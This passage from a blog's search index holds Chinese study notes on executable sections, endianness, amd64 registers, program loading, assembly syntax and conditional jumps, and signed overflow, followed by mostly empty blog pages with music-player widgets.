src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230114154419.png" alt="QQ截图20230114154419"></p><p>节： 在磁盘上的可执行文件的一个结构。大多由机器码构成。</p><p>数据段：不是机器码（代码），可能地址或者其他的数据</p><h2 id="c语言代码是怎么变成与段和节的划分的对应关系">c语言代码是怎么变成与段和节的划分的对应关系</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230114155118.png" alt="QQ截图20230114155118"></p><p>glb : 未初始化的全局变量 ——&gt;Bss（不需要占用磁盘空间，但占用内存空间）</p><p>hello world! ：只读不可写不可执行，放在text段，只读数据（可读可写的数据才会放到data段）</p><p>sum函数 : 被编译后成为数据（机器码，代码）放到text段</p><p>t（局部变量）: 放在栈中</p><p>sum(1,2) : 改行也放在栈中</p><p>ptr : 放在栈中，指向堆上开辟的0x100的空间的首地址</p><h2 id="大端序和小端序">大端序和小端序</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230114165725.png" alt="QQ截图20230114165725"></p><p><font size='5'>小端序</font></p><p>低低高高：低位存放在小地址，高位存放在大地址</p><p><font size='5'>大端序</font></p><p>高位存放在低地址，低位存放在大地址</p><h2 id="程序的执行过程">程序的执行过程</h2><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230114170640.png" alt="QQ截图20230114170640"></p><p>PC: 总是保存了当前在内存中代码段中正在执行的地址</p><p><font size="5">amd64寄存器结构</font></p><ul><li>rax: 8 Bytes</li><li>eax: 4 Bytes</li><li>ax : 2 Bytes</li><li>ah : 1 Bytes</li><li>al : 1 Bytes</li></ul><p><font size='5'>部分寄存器功能</font></p><ul><li><p>RIP-pc(program counter)</p><ul><li>存放下一条执行的指令的偏移地址</li></ul></li><li><p>RSP</p><ul><li>存放当前栈帧的栈顶偏移地址</li></ul></li><li><p>RBP</p><ul><li>存放当前栈帧的栈底偏移地址</li></ul></li><li><p>rax</p><ul><li>通用寄存器，存放函数返回值</li></ul></li></ul><h1 id="装载与汇编">装载与汇编</h1><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230115190601.png" alt="QQ截图20230115190601"></p><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230115193900.png" alt="QQ截图20230115193900"></p><p>fork() 另启了一个新进程，在这个新进程中使用execve的系统调用，进入内核状态，内核执行kernel mode中的几个函数，新的进程就会进入_start标签，从而进入目标进程的main函数或者__libc_start_main函数。</p><h3 id="汇编">汇编</h3><h5 id="指令格式">指令格式</h5><table><thead><tr><th>Base</th><th>index</th><th>scale</th></tr></thead><tbody><tr><td>0</td><td>2</td><td>4</td></tr></tbody></table><p>偏移地址：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>+</mo><mn>2</mn><mo>∗</mo><mn>4</mn><mo>=</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">0+2*4 = 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span>。Displacement，位移。假设，位移为0x10。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>+</mo><mn>2</mn><mo>∗</mo><mn>4</mn><mo>+</mo><mn>0</mn><mi>x</mi><mn>10</mn><mo>=</mo><mn>24</mn></mrow><annotation encoding="application/x-tex">0+2*4 + 0x10 = 24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">10</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span>。偏移(offset)。</p><h5 id="call指令">Call指令</h5><p>push 调用函数后的下一条指令。然后，jmp过去。</p><h5 id="mov指令">MOV指令</h5><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230115193802.png" alt=""></p><p>mov指令，为传送指令。</p><h4 id="两种汇编格式">两种汇编格式</h4><p><img src="https://shans-s.oss-cn-chengdu.aliyuncs.com/shans2/QQ%E6%88%AA%E5%9B%BE20230115194428.png" alt="QQ截图20230115194428"></p><h5 id="intel汇编格式">intel汇编格式</h5><p>byte ptr。</p><table><thead><tr><th>intel</th><th>at&amp;t</th></tr></thead><tbody><tr><td>mov qword ptr [rsp], 0xffff</td><td>movq $0xffff, (%rsp)</td></tr></tbody></table><p>at&amp;t， Disp(base, index, scale)。</p><p>intel，[base+index*scale]Disp。</p><h5 id="jmp-condition指令">Jmp condition指令</h5><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>77 <strong>cb</strong></td><td>JA <strong>rel8</strong></td><td>高于（CF=0 且 ZF=0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JAE <strong>rel8</strong></td><td>高于或等于 (CF=0) 时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JB <strong>rel8</strong></td><td>低于 (CF=1) 时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JBE <strong>rel8</strong></td><td>低于或等于（CF=1 或  ZF=1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JC <strong>rel8</strong></td><td>进位 (CF=1) 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JCXZ <strong>rel8</strong></td><td>CX 寄存器为 0 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JECXZ <strong>rel8</strong></td><td>ECX 寄存器为 0 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JE <strong>rel8</strong></td><td>等于 (ZF=1) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JG <strong>rel8</strong></td><td>大于（ZF=0 且 SF=OF）时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JGE <strong>rel8</strong></td><td>大于或等于 (SF=OF) 时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JL <strong>rel8</strong></td><td>小于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JLE <strong>rel8</strong></td><td>小于或等于（ZF=1 或 SF&lt;&gt;OF）时短跳转</td></tr></tbody></table><h3 id="数学基础">数学基础</h3><h5 id="加法群">加法群</h5><p>模2加。异或。</p><h5 id="z-3"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Z_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></h5><p>mod 3。0， 1， 2。问题：2的逆，是多少。-2？不对，因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Z</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">Z_{3}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>里面，没有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">-2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">2</span></span></span></span>。所以，2的逆，为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>2</mn><mo>+</mo><mn>3</mn><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">-2 + 3 = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。每3，一个轮回。</p><p>思考一下，二进制位的取反加一，其实是什么？就是“加一个轮回”。</p><p>例子：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>2</mn></msup><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">2^2 = 4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>。0b00, 0b01, 0b10, 0b11。问，0b01，的逆是多少。先进行取反，0b10，就是加了“<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>−</mo><mn>1</mn><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">4-1 = 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>“，所以，还要加一，才是一个轮回。</p><h5 id="溢出的问题">溢出的问题</h5><p>正数加正数，不可能等于一个负数，如果出现了，就是溢出。负数加负数，也不可能等于一个正数，如果出现了，就是溢出。溢出的概念，只发生在有符号数。无符号数，是没有溢出这个概念的。</p><p>于是，这就涉及到了，有符号数的大小判断。因为CMP，作的是目的操作数，减去源操作数的一个减法运算。试想一下，如果目的操作数，是一个正数，而源操作数，是一个负数。那么，正数减去负数，就相当于正数加正数。</p><p>有符号数，正数的最高位，是0。但是，两个正数相加，最高位，可能溢出，变成了1。这不就出现了负数了吗。从，目的操作数，与源操作数的符号(正负)，可知，目的操作数为正数，肯定大于负数。结果为，”&gt;“，大于。</p><p>发生了溢出之后，OF=1。但SF=1(负数)。此时，OF=SF，所以是大于。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="计算机类在读-剩下的后面再写">计算机类在读，，剩下的后面再写</h1>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>相册</title>
      <link href="/photos/index.html"/>
      <url>/photos/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="这个也是">这个也是</h1>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>    <div id="aplayer-oPmsrLee" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="3166847468" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="true" data-mutex="false" data-listmaxheight="400px" data-preload="auto" data-theme="#ad7a86"    ></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>影视</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="应该不会写这个地方">应该不会写这个地方</h1><p>如果有，再说</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="留什么言-发qq或者微信不好吗">留什么言，发QQ或者微信不好吗</h1>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分享</title>
      <link href="/shuoshuo/index.html"/>
      <url>/shuoshuo/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h1 id="还没想好写什么呢">还没想好写什么呢</h1>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script>]]></content>
      
    </entry>
    
    
  
</search>
